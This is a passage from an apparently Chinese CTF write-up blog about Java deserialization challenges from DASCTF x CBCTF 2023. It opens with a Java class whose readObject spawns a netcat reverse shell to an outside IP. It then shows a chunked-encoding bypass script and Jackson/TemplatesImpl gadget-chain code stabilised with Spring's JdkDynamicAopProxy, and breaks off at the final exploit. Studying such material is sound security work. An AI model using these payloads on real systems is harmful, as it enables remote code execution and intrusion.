class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> InterruptedException, IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;nc&quot;</span>,<span class="string">&quot;43.143.192.19&quot;</span>,<span class="string">&quot;1145&quot;</span>,<span class="string">&quot;-e&quot;</span>,<span class="string">&quot;/bin/sh&quot;</span>&#125;);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> p.getInputStream();</span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is));</span><br><span class="line">        p.waitFor();</span><br><span class="line">        <span class="keyword">if</span>(p.exitValue()!=<span class="number">0</span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span>((s=reader.readLine())!=<span class="literal">null</span>)&#123;</span><br><span class="line">            System.out.println(s);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写个 exp 类，编译好后再上传，别直接 sb 到把 java 上传了</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102150011.png" alt="微信截图_20231102150011"></p><p>但是👴不太高兴，因为有点 bug, 第一次搭 docker 打不成，第二次终出了😒.</p><h1 id="dasctfxcbctf_2023_bypassjava"><span id="dasctfxcbctf_2023_bypassjava"> DASCTFXCBCTF_2023_bypassJava</span></h1><p>真 tm 恶心的 java 题，不仅有绕过，还 tm 有 RASP 这种抽象的东西，👴太弱了，👴要学.</p><p>题目环境甚至不是靶机，而是静态资源，很不爽.</p><p>还好出题人开源了:<a href="https://github.com/pankass/DASCTF_X_CBCTF2023_bypassJava">pankass/DASCTF_X_CBCTF2023_bypassJava: 题目源码和 docker 环境 (github.com)</a></p><h2 id="content-length-限制"><span id="content-length-限制"> Content-Length 限制</span></h2><p>不多说，第一时间想到 jackson 链子，但是有长度限制</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102154201.png" alt="微信截图_20231102154201"></p><p>这长度限制是人能想出来的吗😓,nm 稍微大一点，随便不都得几千？</p><p>过不了，根本过不了，让我看看 bypass 怎么个事:<img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102155013.png" alt="微信截图_20231102155013"></p><p>这里如果头部有 transfer-encoding, 就会进 <code>addInputFilter</code></p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102160618.png" alt="微信截图_20231102160618"></p><p>这里面如果有 chunked, 那么就会设置成 <code>this.contentDelimitation</code>  为 true</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231102160810.png" alt="微信截图_20231102160810"></p><p>最后这里就会进入 if, 从而设置 ContentLength 为 - 1, 绕过长度限制.</p><h2 id="chuncked-编码怎么发"><span id="chuncked-编码怎么发"> chuncked 编码怎么发</span></h2><p><a href="https://www.cnblogs.com/xuehaoyue/p/6639029.html">分块编码（Transfer-Encoding: chunked） - 妙音天女 - 博客园 (cnblogs.com)</a></p><p>简单看一下们大概就是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">十六进制长度/r/n</span><br><span class="line"> content/r/n</span><br><span class="line">  ....  </span><br><span class="line">    </span><br><span class="line"><span class="number">0</span>/r/n</span><br><span class="line"> /r/n</span><br></pre></td></tr></table></figure><p>每一块都是 <code>十六进制表示长度</code> 然后， <code>/r/n</code></p><p>接着输入 content, 然后 <code>/r/n</code></p><p>最后一块一定要输入 <code>0/r/n/r/n</code></p><p>👴浅浅写个脚本</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="type">requests</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8080/read&quot;</span></span><br><span class="line">content = open(<span class="string">&quot;data.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">leng = hex(len(content)).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">body = leng+<span class="string">&quot;\r\n&quot;</span>+content+<span class="string">&quot;\r\n0\r\n\r\n&quot;</span></span><br><span class="line">print(body)</span><br><span class="line"></span><br><span class="line">headers= &#123;<span class="string">&quot;transfer-encoding&quot;</span>:<span class="string">&quot;chunked&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = requests.post(url=url,data=body,headers=headers)</span><br></pre></td></tr></table></figure><p>soeasy,🤣,</p><p>然而这只是第一步，👴现场甚至第一步都没过去.</p><h2 id="不稳定-jackson-链问题"><span id="不稳定-jackson-链问题"> 不稳定 jackson 链问题</span></h2><p><a href="https://pankas.top/2023/10/04/%E5%85%B3%E4%BA%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%ADjackson%E9%93%BE%E5%AD%90%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/">关于 java 反序列化中 jackson 链子不稳定问题 (pankas.top)</a></p><p><a href="https://xz.aliyun.com/t/12846">从 JSON1 链中学习处理 JACKSON 链的不稳定性 - 先知社区 (aliyun.com)</a></p><p>👴ctmd 打 jackson 链子的时候，有史以来第一次遇见了陌生的报错</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.fasterxml.jackson.databind.JsonMappingException: (was java.lang.NullPointerException) (through reference chain: com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl[<span class="string">&quot;stylesheetDOM&quot;</span>])</span><br></pre></td></tr></table></figure><p>且经过本地调试，似乎进入了陌生的代码段，👴很不乐意.</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231103150351.png" alt="微信截图_20231103150351"></p><p>具体来说，就是在调用 getters 的时候，优先奏了 <code>getStylesheetDOM</code>  这个方法，但是，众所周知，我们在序列化的时候，是不会去设置这个值的，所以理所应当的，nmd 空指针了.😓😅而当其调用 getter 方法时优先调用  <code>getOutputProperties</code>  方法时才是我们正常想要的结果。</p><p>这 nm 真有坑啊，比赛想打这条链子，不说 ban 位问题，nmd 这问题也只能通过不停地重置靶机解决了，比赛你重置靶机，静态地址等似吧.</p><p>现在👴来分析一下怎么个事，优化一下</p><h3 id="流程"><span id="流程"> 流程</span></h3><p>这条链子分析👴不想说了，闭着眼睛都知道怎么个事.</p><p>关键是触发 <code>POJONode</code>  的 <code>toString</code>  方法，然后内部经过一系列序列化器调用  <code>POJONode</code>  中封的  <code>_value</code>  属性的 getter 方法，从而调用  <code>TemplatesImpl</code>  类型对象的  <code>getOutputProperties</code>  方法从而导致执行任意代码。</p><p>重点就是从 <code>toString</code>  到 <code>getters</code>  的调用这一过程</p><p>栈调试放在这:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:<span class="number">507</span>, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java.lang.reflect)</span><br><span class="line">serializeAsField:<span class="number">689</span>, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeFields:<span class="number">774</span>, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">178</span>, BeanSerializer (com.fasterxml.jackson.databind.ser)</span><br><span class="line">defaultSerializeValue:<span class="number">1142</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">serialize:<span class="number">115</span>, POJONode (com.fasterxml.jackson.databind.node)</span><br><span class="line">serialize:<span class="number">39</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">20</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">_serialize:<span class="number">480</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeValue:<span class="number">319</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serialize:<span class="number">1518</span>, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)</span><br><span class="line">_writeValueAndClose:<span class="number">1219</span>, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">writeValueAsString:<span class="number">1086</span>, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">nodeToString:<span class="number">30</span>, InternalNodeMapper (com.fasterxml.jackson.databind.node)</span><br><span class="line">toString:<span class="number">136</span>, BaseJsonNode (com.fasterxml.jackson.databind.node)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在  <code>com.fasterxml.jackson.databind.ser.BeanPropertyWriter#serializeAsField</code>  方法中利用反射来执行其  <code>getters</code>  方法</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231103152329.png" alt="微信截图_20231103152329"></p><p>这次就调用了 getoutputProperties, 很好，👴喜欢🤪</p><p>那就往前看看哪里获取了 <code>getters</code></p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231103152702.png" alt="微信截图_20231103152702"></p><p>在 <code>com.fasterxml.jackson.databind.ser.std.BeanSerializerBase#serializeFields</code>  中， <code>prop</code>  数组存储了 <code>getters</code> , 通过循环遍历所有 <code>getters</code>  并调用 <code>serializeAsField</code></p><p>追踪一下这个变量，从 <code>_props</code>  获得</p><p>最终在 <code>com.fasterxml.jackson.databind.introspect</code>  赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">collectAll:<span class="number">418</span>, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">getJsonValueAccessor:<span class="number">270</span>, POJOPropertiesCollector (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">findJsonValueAccessor:<span class="number">258</span>, BasicBeanDescription (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">findSerializerByAnnotations:<span class="number">391</span>, BasicSerializerFactory (com.fasterxml.jackson.databind.ser)</span><br><span class="line">_createSerializer2:<span class="number">224</span>, BeanSerializerFactory (com.fasterxml.jackson.databind.ser)</span><br><span class="line">createSerializer:<span class="number">173</span>, BeanSerializerFactory (com.fasterxml.jackson.databind.ser)</span><br><span class="line">_createUntypedSerializer:<span class="number">1495</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">_createAndCacheUntypedSerializer:<span class="number">1443</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">findValueSerializer:<span class="number">544</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">findTypedValueSerializer:<span class="number">822</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">defaultSerializeValue:<span class="number">1142</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">serialize:<span class="number">115</span>, POJONode (com.fasterxml.jackson.databind.node)</span><br><span class="line">serialize:<span class="number">39</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">20</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">_serialize:<span class="number">480</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeValue:<span class="number">319</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serialize:<span class="number">1518</span>, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)</span><br><span class="line">_writeValueAndClose:<span class="number">1219</span>, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">writeValueAsString:<span class="number">1086</span>, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">nodeToString:<span class="number">30</span>, InternalNodeMapper (com.fasterxml.jackson.databind.node)</span><br><span class="line">toString:<span class="number">136</span>, BaseJsonNode (com.fasterxml.jackson.databind.node)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231103220943.png" alt="微信截图_20231103220943"></p><p>这里就是第一次决定 <code>getters</code>  顺序</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231104081525.png" alt="微信截图_20231104081525"></p><p>随后通过 <code>getDeclaredMethods</code>  获取方法，那这里获取方法的顺序是不固定的。</p><p>并且，在 <code>com.fasterxml.jackson.databind.SerializerProvider#findTypedValueSerializer</code>  方法里，会将获取的方法顺序进行缓存，之前提到过了，缓存后会进入其它 if。</p><p>因此第一次打不通，之后也无法打通了</p><h3 id="为什么顺序不一定"><span id="为什么顺序不一定"> 为什么顺序不一定</span></h3><p>获取顺序是根据地址的大小来排序的，期间存在内存 free 的动作，那地址是不会一直线性变化的，之所以不按照字母排序，主要还是为了速度考虑，根据地址排序是最快的。</p><p>是反射  <code>getDeclaredMethods</code>  获取到方法的顺序是不确定的，最终导致执行相关 getter 方法的顺序也是不确定的，当  <code>TemplatesImpl</code>  的  <code>getStylesheetDOM</code>  方法先于  <code>getOutputProperties</code>  方法执行时就会导致空指针异常从而导致调用链报错中断，exp 利用失败。</p><h3 id="解决方法"><span id="解决方法"> 解决方法😊</span></h3><p><code>org.springframework.aop.framework.JdkDynamicAopProxy</code>  解决问题</p><h4 id="实现"><span id="实现"> 实现</span></h4><p>众所周知，java 有个 b 玩意叫做 <code>动态代理</code> ，很 nb,👴只在 cc 中用过，不清楚.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">myProxy</span> <span class="operator">=</span> Proxy.newProxyInstance(TestProxy.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;TestInterface1.class, TestInterface2.class&#125;, <span class="keyword">new</span> <span class="title class_">MyHandler</span>());</span><br><span class="line">        <span class="keyword">for</span>(Method m: myProxy.getClass().getDeclaredMethods()) &#123;</span><br><span class="line">            System.out.println(m.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">TestInterface1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">TestInterface2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestProxy</span> &#123;</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;eat something&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;say something&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">(String a)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;invoke dynamic proxy handler&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231105214715.png" alt="微信截图_20231105214715"></p><p>这是执行结果，可以看懂能获取到的方法，完全取决于接口实现了哪些方法</p><p>而  <code>javax.xml.transform.Templates</code>  接口其只有  <code>newTransformer</code>  和  <code>getOutputProperties</code>  这个两个方法，让他作为我们代理所需的接口，这样最终通过  <code>getDeclaredMethods</code>  获取到的方法就只有  <code>newTransformer</code>  和  <code>getOutputProperties</code>  了，那么最终获得的 getter 方法便只有  <code>getOutputProperties</code>  了。</p><p>因此只需要挂代理，就只会获取接口方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">myProxy</span> <span class="operator">=</span> Proxy.newProxyInstance(TestProxy.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">MyHandler</span>());</span><br><span class="line">        <span class="keyword">for</span>(Method m: myProxy.getClass().getDeclaredMethods()) &#123;</span><br><span class="line">            System.out.println(m.getName());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">TestInterface1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">TestInterface2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestProxy</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;eat something&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">say</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;say something&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">(String a)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;invoke dynamic proxy handler&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231106082615.png" alt="微信截图_20231106082615"></p><p>这两个方法是 <code>Templates</code>  里面定义的接口方法</p><p><code>JdkDynamicAopProxy</code>  是 Spring 框架中的一个类，它实现了 JDK 动态代理机制，用于创建代理对象来实现面向切面编程（AOP）的功能。</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231105215128.png" alt="微信截图_20231105215128"></p><p>这里能够控制 advised</p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231105215235.png" alt="微信截图_20231105215235"></p><p>这里会触发反射方法，这里 <code>advised</code>  前面说过了可控</p><p>我们将所需的  <code>TemplatesImpl</code>  的对象用  <code>org.springframework.aop.framework.AdvisedSupport</code>  封装即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">oldProxy</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">setProxyContext</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">TargetSource</span> <span class="variable">targetSource</span> <span class="operator">=</span> <span class="built_in">this</span>.advised.targetSource;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">target</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231105215851.png" alt="微信截图_20231105215851"></p><p><img src="/2023/11/30/DAS0RAYSXCBCTF/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231105220106.png" alt="微信截图_20231105220106"></p><h3 id="构造"><span id="构造"> 构造</span></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);</span><br><span class="line">cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">AdvisedSupport</span> <span class="variable">advisedSupport</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">advisedSupport.setTarget(templatesImpl);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) cons.newInstance(advisedSupport);</span><br><span class="line"><span class="type">Object</span> <span class="variable">proxyObj</span> <span class="operator">=</span> Proxy.newProxyInstance(clazz.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, handler);</span><br><span class="line"><span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(proxyObj);</span><br></pre></td></tr></table></figure><p>👴の最後のエクスプロイト</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 